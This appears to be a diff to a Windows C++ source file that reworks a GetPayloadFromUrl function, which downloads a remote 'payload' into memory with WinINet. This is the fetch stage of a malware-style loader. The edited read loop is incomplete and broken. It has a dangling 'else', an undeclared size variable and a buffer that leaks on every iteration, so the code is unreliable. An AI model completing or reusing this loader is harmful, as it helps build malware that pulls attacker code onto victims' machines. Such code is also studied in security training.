@@ -2,7 +2,7 @@
 #include <Windows.h>
 #include <wininet.h>
 
-BOOL GetPayloadFromUrl() {
+BOOL GetPayloadFromUrl(LPCWSTR szurl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 	DWORD dwBytesRead = NULL;
 
 	//opening internet session handle
@@ -19,14 +19,29 @@ BOOL GetPayloadFromUrl() {
 		return FALSE;
 	}
 
-	//allocating buffer to payload
-	PBYTE pBytes = (PBYTE)LocalAlloc(LPTR, 272);
-
-	//read the payload
-	if (!InternetReadFile(hInternetFile, pBytes, 272, &dwBytesRead)) {
-		std::wcerr << L"[!] InternetReadFile Failed with error : " << GetLastError() << std::endl;
+	PBYTE pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+	if (!pTmpBytes) {
 		return FALSE;
 	}
+
+	while (TRUE) {
+		//allocating buffer to payload
+		PBYTE pBytes = (PBYTE)LocalAlloc(LPTR, 272);
+
+		//read the payload
+		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+			std::wcerr << L"[!] InternetReadFile Failed with error : " << GetLastError() << std::endl;
+			return FALSE;
+		}
+		sSize += dwBytesRead;
+
+		if (!pBytes)
+			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+		else
+
+	}
+
+	
 
 	InternetCloseHandle(hInternet);
 	InternetCloseHandle(hInternetFile);
